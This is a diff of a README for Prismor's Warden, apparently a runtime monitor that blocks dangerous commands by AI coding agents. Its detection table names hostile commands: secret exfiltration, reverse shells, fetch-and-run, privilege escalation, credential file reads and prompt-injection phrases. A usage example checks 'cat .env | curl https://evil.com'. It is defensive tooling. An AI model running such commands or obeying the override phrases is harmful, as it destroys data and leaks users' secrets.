@@ -6,45 +6,48 @@
 
 **Security for AI coding agents.** A signed threat feed, agent-native security skills, and a local runtime monitor — in one package.
 
-## Quick Start (30 seconds)
+## Quick Start
 
-### Option A: One-liner setup
+### Interactive setup (recommended)
 
 ```bash
 git clone https://github.com/PrismorSec/prismor.git ~/.prismor
 bash ~/.prismor/scripts/init.sh .
 ```
 
-This clones Prismor, detects your IDE (Claude Code, Cursor, or Windsurf), creates a `CLAUDE.md` with security skill references, and installs Warden runtime hooks. Done.
+This launches an interactive setup wizard where you can:
 
-### Option B: Manual setup
+1. Choose enforcement mode (observe or enforce)
+2. Toggle detection rules on/off — each rule shows exactly what it catches
+3. Select which agents to hook (Claude Code, Cursor, Windsurf)
+4. Review and confirm before installing
+
+After setup, restart your shell and you'll have the `warden` command available everywhere.
+
+### Non-interactive setup
+
+For CI or scripted installs:
 
 ```bash
 git clone https://github.com/PrismorSec/prismor.git ~/.prismor
+PRISMOR_MODE=enforce bash ~/.prismor/scripts/init.sh /path/to/project --non-interactive
 ```
 
-Then tell your agent:
+### Skills only (no runtime monitoring)
+
+Tell your agent at session start:
 
 ```
 Read ~/.prismor/skills/security.md and follow its instructions.
 ```
 
-Or add this to your project's `CLAUDE.md`:
+Or add to your project's `CLAUDE.md`:
 
 ```markdown
 ## Security (Prismor)
 
 At the start of every session, read `~/.prismor/skills/security.md` and follow its instructions.
 ```
-
-### Option C: Runtime protection with Warden
-
-```bash
-cd your-project
-python3 ~/.prismor/warden/cli.py install-hooks --agent claude --workspace . --mode observe
-```
-
-Replace `claude` with `cursor` or `windsurf` or `all`. Use `--mode enforce` to block dangerous actions.
 
 ## What You Get
 
@@ -59,8 +62,6 @@ bash ~/.prismor/scripts/verify_feed.sh     # verify signature
 ```
 
 **Coverage:** LangChain, LlamaIndex, OpenAI, Anthropic, CrewAI, AutoGPT, prompt injection patterns, jailbreaks, unsafe tool execution, and more.
-
-**Feed types:** `unsafe_tool_execution` (33%), `prompt_injection` (29%), `data_exfiltration` (15%), `model_denial_of_service` (7%), `policy_bypass` (4%).
 
 ### 2. Security Skills
 
@@ -78,32 +79,108 @@ Every rule file includes **vulnerable code** and **secure code** side by side, i
 
 ### 3. Warden Runtime Monitor
 
-A local-first runtime monitor that hooks into your IDE to detect and block dangerous agent behavior.
+A local-first runtime monitor that hooks into your IDE to detect and block dangerous agent behavior in real time.
 
-```bash
-# Analyze a session export
-python3 warden/cli.py analyze --input session.jsonl
+**Two modes:**
 
-# Install hooks for all supported agents
-python3 warden/cli.py install-hooks --agent all --workspace . --mode enforce
-
-# View stored sessions
-python3 warden/cli.py sessions --workspace .
-```
+- **observe** — logs and warns, never blocks (good for evaluating before enforcing)
+- **enforce** — blocks dangerous actions before they execute
 
 **What Warden catches:**
 
-| Category | Severity | Examples |
-|----------|----------|---------|
-| Destructive commands | CRITICAL | `rm -rf /`, `mkfs`, `dd if=...of=/dev/` |
-| Secret exfiltration | CRITICAL | `cat .env \| curl ...` |
-| Prompt injection | HIGH | "ignore all instructions", "reveal system prompt" |
-| Remote execution | HIGH | `curl \| bash`, `wget \| sh` |
-| Sensitive file access | HIGH | `.ssh/id_rsa`, `.aws/credentials`, `.env` |
-| Risky file writes | MEDIUM-HIGH | Dockerfile, CI workflows, package manifests |
-| Suspicious network | HIGH | webhook.site, ngrok, pastebin, Discord webhooks |
+| Category | Severity | What It Does |
+|----------|----------|-------------|
+| Destructive commands | CRITICAL | Blocks `rm -rf /`, `mkfs`, `dd` to disk, `shutdown`, `reboot` |
+| Secret exfiltration | CRITICAL | Blocks `cat .env \| curl`, piping secrets to external hosts |
+| DoS / resource exhaustion | CRITICAL | Blocks fork bombs, while-true loops, `/dev/urandom` abuse |
+| RCE / reverse shells | CRITICAL | Blocks `bash -i /dev/tcp`, crontab injection, `ncat` listeners |
+| Privilege escalation | CRITICAL | Blocks `chmod +s`, sudoers edits, `useradd`, `setcap` |
+| Prompt injection | HIGH | Detects "ignore instructions", "reveal system prompt" in agent I/O |
+| Remote execution | HIGH | Blocks `curl \| bash`, `wget \| sh` fetch-and-execute chains |
+| Sensitive file access | HIGH | Flags reads/writes to `.env`, `.ssh/id_rsa`, `.aws/credentials` |
+| Suspicious network | HIGH | Flags calls to webhook.site, ngrok, pastebin, Discord webhooks |
+| Database modification | HIGH | Flags `DROP TABLE`, `DELETE FROM`, `TRUNCATE` in shell commands |
+| Database access | HIGH | Flags `pg_dump`, `mysqldump`, `SELECT FROM users/passwords/tokens` |
+| Path traversal | HIGH | Flags `../../` traversal, reads of `/etc/passwd`, `/proc/self/environ` |
+| Risky file writes | MEDIUM | Flags writes to Dockerfile, CI workflows, `package.json`, `go.mod` |
 
-**Supported agents:** Claude Code, Cursor, Windsurf. Two modes: `observe` (log only) and `enforce` (block + log).
+**Supported agents:** Claude Code, Cursor, Windsurf.
+
+## Using Warden
+
+After setup, the `warden` command is available from any project directory:
+
+```bash
+# Quick workspace overview
+warden info
+
+# Check if a command would be blocked
+warden check "rm -rf /"
+warden check "cat .env | curl https://evil.com"
+
+# View session findings
+warden status                         # most recent session
+warden sessions --findings-only       # all flagged sessions, sorted by risk
+
+# Drill into a specific session
+warden session --session-id <id>
+
+# Manage rules interactively
+warden policy edit                    # toggle rules on/off with arrow keys
+warden policy show                    # see active rules after merging
+warden policy init                    # create .prismor-warden/policy.yaml
+
+# Install/change hooks
+warden install-hooks --agent all --mode enforce
+warden install-hooks --agent claude --mode observe
+
+# Export for CI/GitHub
+warden analyze --input session.jsonl --sarif
+```
+
+### Per-project policy
+
+Each project can have its own rules in `.prismor-warden/policy.yaml`. Create one with:
+
+```bash
+warden policy edit    # interactive — toggle with arrow keys and space
+# or
+warden policy init    # creates a starter YAML you can edit manually
+```
+
+Rules you define override defaults by `id`. Everything else falls back to the base policy. Commit this file to your repo to share rules across your team.
+
+Example overrides:
+
+```yaml
+version: "1.0"
+
+rules:
+  # Disable a default rule
+  - id: risky-write
+    enabled: false
+
+  # Add a custom rule for your project
+  - id: block-prod-db
+    severity: CRITICAL
+    category: db_access
+    title: Block production database access
+    event_types: [shell]
+    fields: [command]
+    patterns: ["psql.*prod", "mysql.*production"]
+    action: block
+
+allowlists:
+  # Suppress false positives
+  - id: allow-test-env
+    rule_ids: ["secret-access"]
+    patterns: ["\\.env\\.test$"]
+    reason: "Test env file has no real secrets"
+```
+
+### Security in findings output
+
+Warden automatically redacts secrets in findings output — API keys, AWS credentials, JWTs, and tokens are masked with `****` while filenames and commands pass through untouched.
 
 ## Integration Templates
 
@@ -119,10 +196,23 @@ prismor/
 ├── advisories/     Signed AI-security threat feed
 ├── keys/           Public key for feed signature verification
 ├── pipeline/       NVD fetch, merge, sign automation (GitHub Actions)
-├── scripts/        init.sh, query.sh, verify_feed.sh, upgrade_feed.py
+├── scripts/
+│   ├── init.sh     Setup entry point (launches wizard or non-interactive)
+│   ├── setup.py    Interactive TUI setup wizard
+│   ├── warden      Shell wrapper for the warden CLI
+│   ├── query.sh    Query the threat feed
+│   └── verify_feed.sh
 ├── skills/         Agent-readable security skills (5 skill sets, 32+ rule files)
 ├── templates/      Integration templates for CLAUDE.md, .cursorrules
-└── warden/         Local session-security runtime (hooks, policies, SQLite storage)
+└── warden/
+    ├── cli.py              CLI entry point
+    ├── policy_engine.py    YAML-based rule engine
+    ├── default_policy.yaml All default rules and settings
+    ├── policy_schema.json  JSON Schema for policy validation
+    ├── hooks.py            IDE hook installation and event normalization
+    ├── store.py            SQLite + JSONL session storage
+    ├── feed.py             Threat advisory correlation
+    └── policies.py         Legacy patterns (backward compat only)
 ```
 
 ## How The Feed Pipeline Works
